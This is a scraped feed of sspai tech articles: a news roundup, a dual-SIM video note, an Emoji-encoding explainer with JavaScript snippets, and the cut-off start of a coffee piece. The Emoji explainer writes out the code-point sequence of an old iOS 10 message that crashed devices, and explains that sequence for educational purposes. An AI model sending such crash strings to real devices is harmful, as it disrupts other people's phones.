正式推出了全新可换镜头 M4/3 相机新品：OM1。该机搭载了一颗 20.4MP 的背照堆栈式 Live MOS 感光元件，采用了新的 TruePic X 处理器，最高感光度可达 ISO 25600，扩展感光度最高为 ISO 102400；机身支持七档五轴抗震，内设 1053 个十字检测对焦点和 1053 个反差对焦点，支持面部、眼部识别对焦以及 AI 识别自动对焦；视频方面支持拍摄 60 fps 的 4K 10-bit 4:2:2、120fps 12-bit RAW DIC 和 240fps 的 1080p 影片，同時也支持 RAW、OM-Log 和 HLG。 OM1 机身支持 IP53 防尘防水，设置有双 UHS-II SD 卡槽，目前机身售价为 19990 港币，2 月下旬起在香港开售。<a href=\"https://chinese.engadget.com/om-system-om-1-olympus-083252689.html\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c864mk5b34ta9bscqvj0.png\"></figure><h3><strong>iPhone 6 Plus 被列为「古董产品」</strong></h3>\n<p>Apple 于 2 月 15 日更新了其古董和淘汰产品清单，其中古董产品中增加了 iPhone 6 Plus，原因是其停售时间超过 5 年。iPhone 6 Plus 于 2014 年 9 月 开售、2016 年 9 月停售，同时期的 iPhone 6 由于停售时期更晚而不在古董产品名单中。<a href=\"https://www.pingwest.com/w/258613\" target=\"_blank\">来源</a></p>\n<h3>《赛博朋克 2077》次世代版更新上线</h3>\n<p>2 月 15 日晚，CD PROJEKT RED 宣布推出版本更新 1.5。本次更新除了包含大量任务和游戏性修正、加入了数个免费 DLC 外，还为 Xbox Series X|S 和 PlayStation®5 带来了光线追踪局部光照阴影、原生成就支持、空间音效、Dual Sense 自适应扳机硬件适配等次世代专属更新。<a href=\"https://www.cyberpunk.net/zh-cn/news/41438/ban-ben-geng-xin-1-5-ci-shi-dai-ban-ben-geng-xin-gai-dong-lie-biao\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c864mkdb34taavnbc0hg.jpeg\"><figcaption>各平台更新内容对比 | 图：CD PROJEKT RED</figcaption></figure><h2>看看就行的小道消息</h2>\n<ul>\n<li>XDA 在对 Google Pixel 4 的 Android 13 DP1 固件进行分析时，发现了一个名为 com.android.nearby 的新 APEX 模块，这意味着 Google 后续或将通过 Project Mainline 为更多 OEM 设备带来 Fast Pair 更新支持。<a href=\"https://www.xda-developers.com/fast-pair-android-13-mainline-module/\" target=\"_blank\">来源</a>\n</li>\n<li>有 Reddit 用户发帖称，近日 Siri 在给出部分回复时用了「答案已显示在您的 HomePod 上」这样的表述；部分网友相信这或许意味着 Apple 正在开发搭载智能显示屏的新款 HomePod 设备。<a href=\"https://mspoweruser.com/siri-may-have-leaked-apples-next-homepod/\" target=\"_blank\">来源</a>\n</li>\n</ul>\n<h2>少数派的近期动态</h2>\n<ul>\n<li>🎁 少数派 iOS 客户端<a href=\"https://itunes.apple.com/cn/app/id1191720421?mt=8\" target=\"_blank\">重大更新</a>，<a href=\"https://apps.apple.com/cn/app/id1191720421?eventid=6442693454\" target=\"_blank\">「派读」功能新鲜上线</a>，为你打造量身定制的内容拼盘。</li>\n<li>📕 <a href=\"https://sspai.com/prime/precog/techod-0x09\" target=\"_blank\">科技漫游第 0x09 期</a> 正在更新，学学如何<a href=\"https://sspai.com/prime/story/shortcuts-blood-pressure-monitering\" target=\"_blank\">用快捷指令帮家人记录血压</a>，更有 <a href=\"https://sspai.com/prime/story/charles-sina-lottery-tutorial\" target=\"_blank\">Charles 抓包实战</a>。</li>\n<li>🎇 会员通讯 <a href=\"https://sspai.com/prime/precog/vol015-pre-moving-forward\" target=\"_blank\">第 15 期</a> 上线，带你了解 <a href=\"https://sspai.com/prime/story/vol015-talk-about-background-check\" target=\"_blank\">工作背景调查</a>、建立 <a href=\"https://sspai.com/prime/story/vol015-how-to-take-smart-notes\" target=\"_blank\">写作工作流</a>、线下 <a href=\"https://sspai.com/prime/story/vol015-ebook-or-physical-book\" target=\"_blank\">读书找书</a> 等。</li>\n<li>☕ 少数派报告《<a href=\"https://sspai.com/prime/precog/specialty-coffee-report\" target=\"_blank\">精品咖啡入门指南</a>》已上线，从相对硬核的咖啡豆种、处理法、烘焙法到大家关心的器材和冲煮攻略，都在这里啦！</li>\n</ul>\n<h2>你可能错过的文章</h2>\n<ul>\n<li>📽️ <a href=\"https://sspai.com/post/71396\" target=\"_blank\">PhoneTalk 视频：低成本实现 iPhone mini「双卡双待」</a>\n</li>\n<li>😂 <a href=\"https://sspai.com/post/71398\" target=\"_blank\">多元、多彩还能紧跟潮流：聊聊 Emoji 的组合与创造</a>\n</li>\n<li>☕ <a href=\"https://sspai.com/prime/story/specialty-coffee-part-4\" target=\"_blank\">日晒、水洗、蜜处理……这些咖啡处理工艺都是什么意思？</a>\n</li>\n<li>✍️ <a href=\"https://sspai.com/post/71272\" target=\"_blank\">年度征文 | 写作，是一种生活方式</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/71476"},{"title":"PhoneTalk 视频：低成本实现 iPhone mini「双卡双待」","date":"2022-02-15 09:26:12","description":"\n<p>本视频内容来自少数派 Matirx 作者 <a class=\"ss-atUser\" data-mention=\"@JLDUAN\" user-id=\"bs2p09db34tch278q6f0\" href=\"https://sspai.com/u/iduan\">@JLDUAN</a> ，已获取授权，文案略有删改，请大家放心观看。</p>\n<p>如果想看到更多少数派文章视频化，请大家关注 PhoneTalk 小破站账号给个一键三连。谢啦！</p>\n<p>如果需要阅读原图文版，可跳转至：</p>\n<span class=\"ss-linkCard\" link-card-href=\"https://sspai.com/post/71054\"> </span><p>视频中 App下载地址如下：</p>\n<span class=\"ss-application\" app-id=\"16132\"> </span><span class=\"ss-application\" app-id=\"16345\"> </span><p>PhoneTalk 的 B 站视频发出后，评论区里也出现了不少好建议。比如：</p>\n<ol>\n<li>Android 手机安装钉钉和 dingtalk-sms，在钉钉建立一个群，把Android 和 iPhone 两个账号的人都拉到一个群里；Android 手机收到的所有短信都通过 dingtalk-sms 这个软件自动转发到钉钉群，iPhone 上也安装着钉钉且在同一个群里。于是就可以收到短信了，延迟极低，几乎是秒转。</li>\n<li>移动卡的话有移动官方的无忧行 App，可以托管转发电话和短信。</li>\n<li>Android 也可以用 Tasker 转发，iPhone 端用微信或其他 IM 应用都可以接收。</li>\n<li>有第二台iPhone（比如老款 SE 或者 6S），可以直接通过 iCloud 同步多台设备的短信内容。</li>\n<li><s>雇一个农民工，送他一台几百块的 Android 手机，叫他把收到的短信转发给我就行了（真·人工智能）</s></li>\n</ol>\n<p>最后，据说今年 9 月没有 iPhone 14 mini 了，这款小屏旗舰或许永远无法实现原生双卡双待，让我们且用且珍惜吧。</p>\n<p>如果你有其它好的文章选题视频化建议，欢迎在下方留言~</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注<a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，发现更多实用小技巧 💸</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/71396"},{"title":"多元、多彩还能紧跟潮流：聊聊 Emoji 的组合与创造","date":"2022-02-15 07:35:41","description":"\n<p><strong>Matrix 首页推荐</strong></p>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>本文尝试讲解 Emoji 的一些有趣的知识，来帮助我们更好的理解这个全世界通用的语言。在开启之前，先看看你的 Emoji 考试能有几分：</p>\n<ol>\n<li>你知道不同的肤色 👍👍🏻👍🏼👍🏽 是怎么实现的吗</li>\n<li>你知道为什么早期 iOS 总会被 Emoji 的问题弄出 crash 吗</li>\n<li>你知道为什么会有两种 Emoji 吗？🅰︎ 🅰️<sup class=\"ss-footnote\" href=\"\" title=\"如果你的浏览器没有将两个 A 渲染成不同的效果，后文会解释可能的原因\" footnote-id=\"1\">1</sup>\n</li>\n</ol>\n<p>从下面开始👇🏻，为了最好的理解📖，可以打开你的浏览器🌍，跟我写点 JavaScript🧑🏻‍💻，一起看看 Emoji 的世界🚗。</p>\n<h2>定义</h2>\n<p>这里我们先统一 Emoji 的定义，到底哪些东西算 Emoji？</p>\n<ul>\n<li>iPhone 输入法里点击 😃 按钮</li>\n<li>微信、抖音的表情</li>\n<li>Telegram 在输入 Emoji 的时候，会有表情包联想。发送 Emoji 后还会有动画</li>\n</ul>\n<p>第一个场景是 Emoji 肯定是毋庸置疑的。它们虽然像图片，但是你复制粘贴后就是能随便发。</p>\n<p>而其他都不算。这里我们做一个定义：<strong>只有能被操作系统定义的编码才有可能是 Emoji。</strong></p>\n<p>怎么理解这段话？</p>\n<p>微信的表情你在输入后，当你退出到列表界面，或者尝试复制它，只能得到类似 <code>[微笑]</code> 的字符，而不是我们看到的微笑表情。所以它们本质上文本，只是微信对它做了图片替换，并保证在删除表情的时候也能直接删除 4 个字符，从而让表现上看上去就和文字类似。</p>\n<figure class=\"ss-imgRows\" figcaption=\"微信的表情其实只是文本替换图片\"><img src=\"https://cdn.sspai.com/2022/02/12/845ac86d1f7729778d71fdf42e35b548.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2022/02/12/4556ffe4462e0aa18d6ad19b84f71f99.png\" alt=\"\"></figure><p>相信你也遇见过这个场景，朋友发了一个消息，你在通知上看到的是一个 😊，你正奇怪这个朋友从来不发 emoji 的时候，点进去一看其实就是微信的 <code>[微笑]</code> 表情。这里为什么会这样呢？</p>\n<p>原因是通知中心的文字里只能是纯文本，所以微信不能对实际上是 <code>[微笑]</code> 的字符做替换，就采用了对这种字符做 Emoji 替换的方式，让其在通知中心的表现不会像有 bug。但需要吐槽的是，微信的微笑应该和 🙂 这个映射才对～</p>\n<p>Telegram 是个非常优秀的社交软件，称他是 IM 的天花板完全不为过。所以你在 Telegram 中发 Emoji 可能会得到一个它们进行定制的动画，特别有喜感。但你将 Emoji 发出去后，<strong>它被传播的形式并不是 Emoji</strong>，而是一个带有动画的图片。只不过这个图片你在复制的时候，得到的还是 Emoji 本身。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/12/9330eb22598df8a53ef6c34fedc35889.gif\"><figcaption>Telegram 对 Emoji 做的动画</figcaption></figure><p>综上我们看到的结论为：<strong>Emoji 就是文字</strong>，它能被复制粘贴，只是看上去是个彩色图片，也只有文字才能被编码。而文字和图片最重要的区别就是字节数量，最大的 Emoji 被编码出来后不会超过 30 个字节，而图片往往要几百字节起。那 Emoji 为普通文字的区别又是什么？</p>\n<p>Emoji 在每个操作系统里都会有一个专门的字体去定义，比如 Apple 就是 <strong>Apple Color Emoji。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/12/article/2a098f420df20e0cae6262157760c7d4\" alt=\"Image.png\"></figure><p>大家熟知的粗体，斜体等文字的风格调整往往都是由字体文件去做定义，它们描述了文字被加粗后的样子。如果字体文件缺失了这个信息的话，操作系统可能回尝试去模拟，也可能就直接忽略。所以这意味着：Emoji 无法被加粗😂</p>\n<p>我们在划定好 Emoji 的范围后才能进一步讨论，接下来先看看它的起源。</p>\n<h2>起源</h2>\n<p><strong>E</strong>(え)<strong>mo</strong>(も)<strong>ji</strong>(じ)—絵文字，其中 <strong>e</strong> 是 绘，<strong>moji</strong> 代表文字的意思，最早起源于日本的 20 世纪 90 年代，由软银推出。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/12/article/f33cc4f605630b4b20567c20f5b63488\" alt=\"softbank-1997-emoji-set-apple-comparison-emojipedia.jpeg\"></figure><p>接着的事情大家都知道了，iPhone 面世，为了占领日本市场（我有一亿人需要用 Emoji 呢），就合作将其弄了进去。并随着 iPhone 的热度提升，Emoji 也开始世界范围内大火 。接着 Emoji 被纳入 Unicode，大部分 Emoji 都有了自己的码位，成为一个事实上的标准。这样消费者也不用担心 iPhone 手机发的 Emoji 安卓看不到了。</p>\n<p>但在当时那个年代，大部分手机屏幕并不是彩色的，所以一开始很多 Emoji 其实是这个样子的：</p>\n<p>🅰︎🅱︎，它们和 🅰️🅱️ 又有什么区别？</p>\n<blockquote><p>NOTE：在实际测试的时候我发现少数派在展示这种 Emoji 的时候，在 Safari 和 Chrome 上表现也有差别，可能会有展示问题。</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/12/69cd09bab46e008406eaec3c338fad69.png\"></figure><p>我们以 🅰︎ 为例子。在最开始的时候，🅰︎ 的 Unicode 编码应该是 1f170<i>。</i>但之后屏幕开始变成彩色，于是定义一套彩色的字符开始有必要。但直接将文字形式的 Emoji 替换成彩色形式可能会对之前的表达带来误解，所以为了兼容这种旧形式，采取了一种比较「奇怪」的方式来获得图片形式——Variation Selector。</p>\n<p>Unicode 中定义了很多不同版本的 Variation Selector，我们只要记住对应 Text 的版本是 15，对应 Emoji 的版本是 <a href=\"https://emojipedia.org/variation-selector-16/\">16</a>，后文将分别简写为 VS-15(0xfe0e)，VS-16(0xfe0f)。于是🅰︎和🅰️的实际编码分别是 0x1f170 0xfe0e 和 0x1f170 0xfe0f。</p>\n<p>如果你感兴趣的话，可以打开浏览器的控制台，输入看看效果。</p>\n<pre class=\"language-javascript\"><code>String.fromCodePoint(0x1f170, 0xfe0e)\nString.fromCodePoint(0x1f171, 0xfe0f)</code></pre>\n<p>所以后续的 Emoji 输入法中，都会刻意添加 VS 来做区分。但之前这些没加的文本应该怎么处理？</p>\n<p>Unicode 建议针对这些没有 VS 符号的字符，采用 VS-15 作为默认，意味着 1f170 应该渲染成文字形式。但是 Apple 可能是为了秀自己的 Emoji 字体，并没有遵守这个标准。所以在不同平台上会有不同效果，比如这个 🈹️</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/12/article/deae3ef67cc2d73ff1502eddf1f8b25a\" alt=\"Image.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/12/article/4f37585890d74993cb97591a46e78906\" alt=\"Image.png\"></figure><p>如果你用过飞书的话，可能就体验过系统输入法给你的建议是图片形式的 Emoji，但是发送出去后就变成文本模式了。就是因为输入法建议的 Emoji 丢了 VS，所以两边的软件具有不同的解释方式</p>\n<h2>旗帜问题</h2>\n<p>接着根据这个 VS-16，让我们来看看 iOS 10 时期出现的一个 <a href=\"https://www.instapaper.com/read/1288315176\">bug</a>：</p>\n<blockquote><p>简单点讲就是一旦收到某人发送过来的含有”🏳️‍0🌈”的短消息，将会导致设备死机，需要重启手机才能解决。</p></blockquote>\n<p>想要解释清楚这个 bug，先要了解一下旗帜的规则。</p>\n<p>我们先记住一个原则，Unicode 非常抠门，为了节省码位它们什么事情都干得出来。你想想，世界上，那么多国家。国家内部可能还有一些地区，这些地区也有自己的旗帜。如果一个个编码显得过于奢侈和复杂。举个例子，假设 Unicode 先给国旗放 500 个码位，然后现有国家用掉了 300 个。未来又有一些奇怪的旗帜也想进去凑数，但这样可能导致剩下的 200 个也不够放，那又需要临时开一个区域放新的码位。针对这个问题，Unicode 也提出了一种解决方案，对气质做了分类</p>\n<ol>\n<li>最简单的旗帜：🚩🏳️🏁🏴🎌。这些旗帜都有独立的码位，不过为了兼容早期，可能会跟着一个 VS-16。</li>\n<li>国旗—🇨🇳🇺🇸🇬🇧。</li>\n<li>地区旗帜—🏴󠁧󠁢󠁥󠁮󠁧󠁿🏴󠁧󠁢󠁳󠁣󠁴󠁿。</li>\n<li>特殊旗帜—🏳️‍🌈🏴‍☠️</li>\n</ol>\n<h3>国旗</h3>\n<p>它们是由专门的 <a href=\"https://en.wikipedia.org/wiki/Regional_Indicator_Symbol\">Regional Indicator Symbol(RIS)</a> 组合而来，从 A 到 Z，码位分别是从 1f1e6 到 1f200，光是两两组合就有 26 * 26 中方案。打开控制台输入</p>\n<pre class=\"language-javascript\"><code>Array.from({ length: 26 }, (_, i) =&gt; String.fromCodePoint(0x1f1e6 + i)).join(',')</code></pre>\n<p>就能看到所有的字符。为什么要用 <code>join(',')</code> 而不是 <code>join('')</code>？试试看😏</p>\n<p>所以🇨🇳就是 🇨 🇳 放在一起，同样的🇺🇸的就是 🇺 🇸。</p>\n<p>如果你对这种两个字符放在一起，会变成新的字符的特性不是很熟悉的话，可能会认为这是 Emoji 的特性，但其实这种被称为 <a href=\"https://en.wikipedia.org/wiki/Combining_character\">Combining Character</a> 的技术很早就已经被支持。</p>\n<p>最常见的使用场景就是拉丁语和音调符号的组合。比如 é 有一个单独的码位 e9，但是它也可以由 e 和 ´ 组合，它们的码位分别是 65 和 301。所以如果你在浏览器输入 <code>'\\u{65}\\u{301}'</code> 也能得到 é。但是像 JS 这种相对落后的语言并不会认为 <code>'\\u{65}\\u{301} === \\u{e9}'</code> 是 <code>true</code>，反观 Swift 这种相对现代的语言，则对这个特性有了良好的支持。</p>\n<h3>地区旗帜</h3>\n<p>我不太懂政治，不太清楚像英格兰和苏格兰这两个地方不是国家（世界杯都是两支队伍），但是它们都有自己的旗帜。这里的组合逻辑就很复杂了，首先需要一个 🏴 跟上 ISO 定义的 RIS，再跟上一个 Cancel Tag(007f)*。像这里英格兰的 RIS 是 *GBENG，可能是 Great Britain EnGLand 的缩写。换句话说，一个🏴󠁧󠁢󠁥󠁮󠁧󠁿就占了 7 个码位，比直接写「英格兰」浪费多了🌚</p>\n<h3>彩虹旗</h3>\n<p>这些旗帜本质上是通过 Emoji 组合起来的。比如彩虹旗就是 🏳️+ZWJ+🌈，🏴‍☠️是🏴+ZWJ+☠️。<a href=\"https://emojipedia.org/zero-width-joiner/\">ZWJ（Zero Width Joiner)</a> 可以理解成 Emoji 胶水，用来粘合一些用于特殊意义的 Emoji，以达到节省码位的目的，它们被称之为 <a href=\"https://blog.emojipedia.org/emoji-zwj-sequences-three-letters-many-possibilities/\">Emoji ZWJ Sequence</a>，毕竟谁能知道 10 年后，我们手机里有多少个 Emoji 呢？插一句题外话，当你发现项目中 <code>if (result == '')</code> 分支怎么都不为真的时候，可能就是有人在代码里下毒了。</p>\n<p>所以，回到我们上面提到 iOS 10 曾经的一个 bug，表面上是🏳️0🌈这种组合，如果直接输入这个几个符号并不会有什么问题，因为它们的对应的编码是 <i>1f3f3, fe0f, 30, 1f308</i>。而会让机器的 Crash 的信息对应的编码 1f3f3, fe0f, 200d, 30, 1f308—<strong>其中多出来的 </strong><i><strong>200d</strong></i><strong> 就是 ZWJ</strong>。所以说，造成这个漏洞的原因可能是：1f3f3, f30f, 200d 同时出现后，系统预期 200d 后面的字符可以组合一个新的 Emoji。但是通过人为添加的 0，过于想当然的系统就 Crash 了。</p>\n<p>接着我们继续展开 ZWJ，看看有哪些 Emoji 是基于这个来创造的。</p>\n<h2>Emoji ZWJ Sequence</h2>\n<p>这个的使用场景除了上面提到的物体之间的组合之外，更多的还是人之间的组合。比如👨和特殊的物品组合在一起，变成了某个专业人士。👨和👩组合在一起，👨👩🧒在一起，👨👨 在一起，都能组合家庭。还有一些虚幻的人物，比如🧚‍♀️，🧟‍♀️这些，从 Emoji 12 开始，出于政治正确的目的，都将这些虚幻人物默认设置为「中性」，并通过 ZWJ 拼接 ♂️和 ♁️。最让我觉得有趣的还是爱情相关的符号：👩‍❤️‍💋‍👩 👩‍❤️‍👨。</p>\n<p>下面我们来详细讨论这些</p>\n<h3>专业人员</h3>\n<p>👩‍🎤👩‍🏫👩‍🔧👩‍🎓，这四个 Emoji 对应的分别是女歌手、女教师、白皮肤的女技师、女大学生。根据 Emoji 的规则就是：</p>\n<p>👩‍🎤：👩 + ZWJ + 🎤</p>\n<p>👩‍🏫：👩 + ZWJ + 🏫</p>\n<p>👩‍🔧：👩 + ZWJ + 🔧</p>\n<p>👩‍🎓：👩 + ZWJ + 🎓</p>\n<p>注意到基本公式就是 性别 Emoji + ZWJ + 一个能表示该专业人员的典型物体。虽然在学校的女人不一定仅仅是老师，还可能是家长、学生，但是一个老师由「女人+ 学校」组成我们很容易记忆。</p>\n<p>其实通过这个规律我们可以看到很有意思的效果——</p>\n<pre class=\"language-javascript\"><code>'👩' + '\\u200d' + '🎤' // 👩‍🎤\n'👩‍🎤'.replace('🎤', '🎓') // 👩‍🎓</code></pre>\n<p>引用 Twitter 上的一幅图：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/12/article/ea5ef98016d935d036ddb501011b1a5d\" alt=\"Photo Apr 16, 2020 at 104117 PM.jpeg\"></figure><h3>虚构人物</h3>\n<p>我尝试尽量列出所有虚拟人物：</p>\n<ul>\n<li>超级英雄：🦸🦸‍♂️🦸‍♀️</li>\n<li>超级反派：🦹🦹‍♂️🦹‍♀️</li>\n<li>法师：🧙🧙‍♂️🧙‍♀️</li>\n<li>仙子：🧚 🧚‍♂️🧚‍♀️</li>\n<li>吸血鬼：🧛🧛‍♂️🧛‍♀️</li>\n<li>人鱼：🧜🧜‍♂️🧜‍♀️</li>\n<li>精灵：🧝🧝‍♂️🧝‍♀️</li>\n<li>妖怪：🧞🧞‍♂️🧞‍♀️</li>\n<li>僵尸：🧟🧟‍♂️🧟‍♀️</li>\n</ul>\n<p>这些虚拟人物的 Emoji 饱含了深深的政治正确。首先，任何角色都有一个男性，也有一个女性在里面，特别是美人鱼还有男性这个完全忍不了，甚至在 iOS 15.4 中还有怀孕的男性 Emoji 出现 :)</p>\n<p>但是呢，Emoji 标准还更进一步，它们又多了一个没有性别的符号，这样的改动看上去似乎是因为近几年平权运动的兴起，所以多了一个符号。</p>\n<p>但是 Emoji 的组合公式也变了，相比之前女性角色是由 男性角色加上 ♂️ 符号，这种过于男权的表现。<strong>现在改为一个没有性别的 Emoji + ZWJ + ♂️或者 ♀️ 表示对应的性别组合。</strong></p>\n<pre class=\"language-javascript\"><code>[...'🧜‍♂️'].map(a =&gt; a.codePointAt(0).toString(16))\n// [\"1f9dc\", \"200d\", \"2642\", \"fe0f\"] (4)</code></pre>\n<h3>爱情</h3>\n<p>一开始对爱情的定义应该挺容易的：💑，男性和女性之间出现了个❤️。公式为 👨 + ZWJ + ❤️ + ZWJ + 👩。秉承着包容的态度，Emoji 也对爱情的定义进行了扩容—👨‍❤️‍👨👩‍❤️‍👩</p>\n<p>有了爱情的下一步就是 kiss，所以 👨‍❤️‍💋‍👨 👩‍❤️‍💋‍👩 也自然少不了。Kiss 相比爱情的 Emoji，是在❤️ 后面接个ZWJ 和 💋‍‍‍——Interesting。</p>\n<p>有了爱情之后，自然就会组成家庭👪</p>\n<h3>Family</h3>\n<p>家庭最开始也挺简单的，爸爸👨和妈妈👩加上几个孩子的组合。一个👦，一个👧，一👦一👧，两个👧，两个👦，就五种——👨‍👩‍👦 👨‍👩‍👧 👨‍👩‍👧‍👦 👨‍👩‍👦‍👦 👨‍👩‍👧‍👧 。</p>\n<p>公式为 👨 + ZWJ + 👩 + ZWJ + 👧 + ZWJ + 👦，你可以很容易验证。</p>\n<p><code>[...'👨👩👧👦'].join('\\u{200d}')</code></p>\n<p>但是不知道从什么时候开始，家庭的概念也被扩充了。有单亲家庭，有同性家庭：👨‍👨‍👧‍👦👩‍👩‍👦‍👦👨‍👧。不过公式相比早期的家庭，仅仅是将 👨 👩 删去一个，或者换成两个同样 Emoji，比如 <code>[...'👨👧👦'].join('\\u{200d}')</code>。</p>\n<p>当然，少不了无性别的符号：👪</p>\n<h3>非标准</h3>\n<p>比如微软对 🐈 的拓展，🐱‍👤 🐱‍💻。这些符号应该只能在 Windows 系统上看到效果，它们的样子类似于图片所示</p>\n<figure class=\"ss-imgRows\" figcaption=\"忍者猫和程序猫\"><img src=\"https://cdn.sspai.com/2022/02/12/c5403deff88ad595f0ee2f791a4bb439.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2022/02/12/d862c988656964cc9456de27d59fca59.png\" alt=\"\"></figure><p> </p>\n<h2>皮肤和发型</h2>\n<p>我们现在已经知道 Emoji 是如何通过组合不同的字符来得到新的 Emoji，而这里的魔力就是 ZWJ。上面提到的规则就涵盖了我们在 Emoji 键盘中绝大多数 Emoji 的组成规则。接着，我们再来看看长按 Emoji 键盘的表现。图片中我以一个卷发男人的 Emoji 为例，长按后可以得到另外的 5 种颜色。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/02/12/article/3608592f74eaaaea116c25f6b485132b\" alt=\"IMG_2217.jpeg\"></figure><p>我记得在几年前，iOS 刚刚支持展示这些皮肤的时候，大家认为默认的颜色代表了「黄种人」，有点点自豪感，但是似乎又过于黄了—这些老外是不是没看过我们亚洲人啊？之所以将基准颜色设计成这种黄色，仅仅是因为世界上没有任何人长这样。而 Emoji 中的部分颜色已经具有含义了，比如绿色的代表了中毒🤢，红色代表了中暑🥵，蓝色代表冷死🥶，所以黄色显然是一个挺不错的选择。</p>\n<p>这五种颜色又是基于什么来判定的？有一种 <a href=\"https://en.wikipedia.org/wiki/Fitzpatrick_scale\">Fitzpatrick(菲茨帕特里克) Scale</a> 分类法，就被 Emoji 皮肤系统采用，虽然最初是为了评估不同肤色的人对紫外线的反应程度。只不过相比 Fitzpatrick Scale 的 6 种的分类，Emoji 仅仅引入了 5 种，它将第一种和第二种合并了，因为这样会看上去更真实。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/12/article/c69fe6c8d17c1679bddb15897e9528ef\" alt=\"640px-Influence_of_pigmentation_on_skin_cancer_risk.png\"></figure><p>所以在 Emoji 中表示颜色的方式就是人物或者人物器官，加上肤色的 Emoji。它们分别是</p>\n<p>🏻 🏼 🏽 🏾 🏿，码位对应：1f3fb, 1f3fc, 1f3fd, 1f3fe, 1f3ff。</p>\n<p>需要强调的是，肤色和下面将要提到的发型，在和支持的 Emoji 组合在一起的时候，是不需要 ZWJ 的，所以 💪 + 🏻 就是 💪🏻。</p>\n<p>可能是工作量的问题，家庭，爱情这些 Emoji 还没有来得及支持肤色。反而是👫的 Emoji 最先支持了多种肤色的排列组合。</p>\n<p>接着，除了皮肤之外，还有发型。红发 🦰卷发🦱 秃头🦲以及白发🦳，它们的码位分别是 1f9b0, 1f9b1, 1f9b2, 1f9b3。我不太清楚为什么会选用这四种发型。</p>\n<p>和皮肤一样，满足公式的 Emoji 并排放在一起就能看到组合成新的的 Emoji —白发的女性 👩‍🦳。因为皮肤和发型并不能直接通过 Emoji 键盘获得，所以如果需要的话，可以通过运行下面的代码：</p>\n<pre class=\"language-javascript\"><code>Array.from({ length: 5 }, (_, i) =&gt; String.fromCodePoint(i + 0x1f3fb))\nArray.from({ length: 4 }, (_, i) =&gt; String.fromCodePoint(i + 0x1f9b0))</code></pre>\n<h2>总结</h2>\n<p>相信看到这里，大家应该已经了解了 Emoji 的相关原理，也能对有些时候编辑 Emoji 的一些怪异行为坦然以对。比如下面肤色的符号： 🏻，看上去👈有一个多出来的空格，但其实你就是删不掉 😊</p>\n<p>如果又因为新的 bug 导致了 iOS 崩溃也不要嘲笑，因为这真的很难 :)</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/12/article/b003b2a3e33cbcc785f23ae6a0706370\" alt=\"CleanShot 2022-02-12 at 14.38.21.gif\"><figcaption>在 Safari 上，英格兰要删好多次才能删除干净</figcaption></figure><h2>参考资料</h2>\n<ul>\n<li><a href=\"https://character.construction/emoji-vs-text\">Emoji vs. Text Presentation character construction</a></li>\n<li><a href=\"https://blog.emojipedia.org/emoji-flags-explained/\">Emoji Flags Explained</a></li>\n<li><a href=\"https://emojipedia.org/subdivision-flags/\">Subdivision Flags</a></li>\n<li><a href=\"http://preston159.com/bug.html\">Reckless Rainbow Bug</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n","link":"https://sspai.com/post/71398"},{"title":"日晒、水洗、蜜处理……这些咖啡处理工艺，到底都是什么意思？","date":"2022-02-15 06:05:07","description":"\n<p>咖啡风味除了被品种、产地、种植方式影响外，还有一个重要的过程——采收处理。不同的处理方法会引导出不同的风味，我们就来聊聊咖啡处理法对风味的影响。</p>\n<h2>咖啡采收</h2>\n<p>咖啡果实，因为形似樱桃，又被称为「咖啡樱桃」。咖啡在采收时，原则上应该采摘全红果实。咖啡果实红透了，说明真正熟透了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/article/4551931aefd7d41a6f6759ed0d25531a\"></figure><p>咖啡成熟后一般有两种采收方式：</p>\n<ul><li>人工采收：咖农背着框，手工采摘咖啡果实。这种方式速度慢，成本高（相对来说，但很多咖啡产地人工成本非常低），但采摘品质可保证。</li></ul>\n<figure class=\"image ss-img-wrapper\"><img 